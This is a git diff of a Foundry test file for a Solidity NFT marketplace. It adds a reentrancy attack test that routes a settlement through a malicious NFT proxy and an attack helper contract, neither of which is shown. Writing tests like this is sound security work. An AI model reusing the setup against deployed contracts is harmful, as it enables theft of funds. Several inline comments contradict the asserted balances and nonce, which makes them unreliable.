@@ -4,12 +4,14 @@ pragma solidity ^0.8.13;
 import {Test, console2} from "forge-std/Test.sol";
 import {NftMarketplace, ListingData, BidData, Signature} from "../src/NftMarketplace.sol";
 import {SigUtils} from "./SigUtils.sol";
+import {Proxy} from "./NFTproxy.sol";
+import {AttackHelper} from "./AttackHelper.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
 contract TestERC20 is ERC20 {
     constructor() ERC20("Test", "TST") {
-        _mint(msg.sender, 500);
+        _mint(msg.sender, 1500);
         this;
     }
 
@@ -80,10 +82,10 @@ contract NftMarketplaceTest is Test {
     }
 
     function test_init() public view {
-        assertEq(erc20.balanceOf(buyer), 500);
+        assertEq(erc20.balanceOf(buyer), 1500);
         assertEq(erc721.balanceOf(owner), 1);
         assertEq(erc721.ownerOf(1), owner);
-        assertEq(erc20.allowance(buyer, address(nftMarketplace)), 500);
+        assertEq(erc20.allowance(buyer, address(nftMarketplace)), 1500);
         assertTrue(erc721.isApprovedForAll(owner, address(nftMarketplace)));
     }
 
@@ -102,7 +104,7 @@ contract NftMarketplaceTest is Test {
             _sign_digest(bidDigest, BUYER_PRIVATE_KEY),
             _sign_digest(bidDigest, OWNER_PRIVATE_KEY)
         );
-        assertEq(erc20.balanceOf(buyer), 250);
+        assertEq(erc20.balanceOf(buyer), 1250);
         assertEq(erc20.balanceOf(owner), 250);
         assertEq(erc721.balanceOf(buyer), 1);
         assertEq(erc721.ownerOf(1), buyer);
@@ -222,8 +224,9 @@ contract NftMarketplaceTest is Test {
     }
 
     function test_buyer_missing_tokens() public {
-        vm.prank(buyer);
-        erc20.transfer(address(this), 500);
+        vm.startPrank(buyer);
+        erc20.transfer(address(this), erc20.balanceOf(buyer));
+        vm.stopPrank();
         vm.expectRevert();
         nftMarketplace.settle(
             owner,
@@ -234,5 +237,43 @@ contract NftMarketplaceTest is Test {
             _sign_digest(bidDigest, BUYER_PRIVATE_KEY),
             _sign_digest(bidDigest, OWNER_PRIVATE_KEY)
         );
+    }
+
+    function test_reentrancy_attack() public {
+        // create malicious proxy ower NFT-contract
+        Proxy nftProxy = new Proxy(address(erc721), address(nftMarketplace));
+        TestERC721 proxyInterface = TestERC721(address(nftProxy));
+        vm.startPrank(owner);
+        // approve spending for proxy
+        erc721.setApprovalForAll(address(nftProxy), true);
+        vm.stopPrank();
+        assertEq(proxyInterface.name(), "NFTtest");
+        assertTrue(erc721.isApprovedForAll(owner, address(nftProxy)));
+
+        AttackHelper attackHelper = new AttackHelper(address(nftMarketplace), address(nftProxy));
+
+        listingData =
+            ListingData({nftContract: IERC721(address(nftProxy)), tokenId: 1, minPriceCents: 100500, nonce: 0});
+
+        bidData = BidData({tokenContract: erc20, value: 250, validUntil: block.timestamp + 1 hours});
+
+        listingDigest = sigUtils.getTypedDataHash(sigUtils.getLisitngHash(listingData));
+        bidDigest = sigUtils.getTypedDataHash(sigUtils.getBidHash(bidData, listingDigest));
+
+        attackHelper.settle(
+            owner,
+            buyer,
+            listingData,
+            bidData,
+            _sign_digest(listingDigest, OWNER_PRIVATE_KEY),
+            _sign_digest(bidDigest, BUYER_PRIVATE_KEY),
+            _sign_digest(bidDigest, OWNER_PRIVATE_KEY)
+        );
+        assertEq(erc721.balanceOf(buyer), 1);
+        assertEq(erc721.ownerOf(1), buyer);
+        assertEq(erc20.balanceOf(buyer), 1250); // buyer has 0 tokens!
+        assertEq(erc20.balanceOf(owner), 250); // owner has 1500 tokens!
+        bytes32 key = keccak256(abi.encode(owner, listingData.nftContract, listingData.tokenId));
+        assertEq(nftMarketplace.nonces(key), 1); // nonce is 6 as it's been 6 re-entrancies
     }
 }
